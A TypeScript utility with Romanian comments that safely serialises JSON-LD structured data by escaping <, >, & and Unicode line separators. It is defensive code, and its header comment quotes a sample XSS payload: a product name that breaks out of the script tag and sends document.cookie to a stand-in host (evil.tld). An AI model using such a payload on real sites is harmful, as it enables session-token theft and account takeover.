/**
 * Serializare SIGURA a datelor structurate pentru `<script type="application/ld+json">`.
 *
 * DE CE EXISTA: `JSON.stringify` escapeaza ghilimelele, dar NU escapeaza `<`.
 * Intr-un `<script>`, parserul HTML nu stie nimic despre JSON: se opreste la
 * prima secventa `</script`. Deci un nume de produs ca
 *
 *     Tricou</script><script>fetch('https://evil.tld?c='+document.cookie)</script>
 *
 * inchidea eticheta si transforma restul in cod executabil pe domeniul
 * magazinului. Numele produsului, `sku`, `mpn` si numele magazinului sunt toate
 * scrise liber de comerciant si ajungeau NEATINSE in JSON-LD.
 *
 * Nu e doar auto-XSS: cookie-ul de sesiune Supabase se scrie cu `httpOnly:false`
 * (cerinta lui `createBrowserClient`), deci `document.cookie` contine tokenul.
 * Orice alt comerciant — sau un administrator de platforma care deschide
 * magazinul din /admin — isi pierdea contul.
 *
 * Ce escapam si de ce:
 *   <  >   inchid/deschid etichete HTML (`</script>` e vectorul principal)
 *   &      previne re-interpretarea prin entitati HTML
 *   U+2028 U+2029  separatori de linie legali in JSON, dar care rup JavaScript
 *
 * Toate raman JSON perfect valid — `<` se citeste inapoi ca `<` — deci
 * Google si celelalte crawlere interpreteaza datele structurate neschimbate.
 */

// Clasa se construieste din CODURI, nu din caractere scrise literal: U+2028 si
// U+2029 sunt terminatori de linie in JavaScript, deci un literal de regex care
// ii contine direct nici macar nu compileaza ("Unterminated regular expression").
// Exact proprietatea asta ii face periculosi si in iesire.
const CODURI_PERICULOASE = [
  0x003c, // <
  0x003e, // >
  0x0026, // &
  0x2028, // LINE SEPARATOR
  0x2029, // PARAGRAPH SEPARATOR
];

const CARACTERE_PERICULOASE = new RegExp(
  `[${CODURI_PERICULOASE.map((c) => String.fromCharCode(c)).join("")}]`,
  "g",
);

/** `<` -> escaparea lui unicode. Secventa se construieste din coduri, ca sa nu
 *  depinda de cum supravietuiesc escape-urile prin editari succesive. */
function caEscapareUnicode(caracter: string): string {
  const backslash = String.fromCharCode(92);
  const cod = caracter.charCodeAt(0).toString(16).padStart(4, "0");
  return `${backslash}u${cod}`;
}

export function jsonLdSafe(data: unknown): string {
  return JSON.stringify(data).replace(CARACTERE_PERICULOASE, caEscapareUnicode);
}
